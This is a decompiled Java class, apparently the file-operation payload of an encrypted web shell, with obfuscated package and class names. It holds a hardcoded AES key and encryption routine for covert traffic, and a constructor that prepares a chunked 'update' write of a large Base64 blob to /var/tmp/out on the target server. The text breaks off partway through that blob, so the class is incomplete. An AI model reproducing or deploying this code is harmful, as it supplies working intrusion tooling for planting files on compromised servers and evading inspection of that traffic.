package com.vgoffj.pycg;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: FileOperation.java */
/* JADX INFO: loaded from: 017_frame_404575.class */
public class Xtcc {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String hash;
    public static String blockIndex;
    public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset;

    private byte[] Encrypt(byte[] bArr) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] bArrDoFinal = cipher.doFinal(bArr);
        try {
            Class<?> cls = Class.forName("java.util.Base64");
            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
        } catch (Throwable th) {
            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
        }
        return bArrDoFinal;
    }

    public Xtcc() {
        mode = "";
        mode += "update";
        path = "";
        path += "/var/tmp/out";
        blockIndex = "";
        blockIndex += "8";
        blockSize = "";
        blockSize += "30720";
        content = "";
        content += "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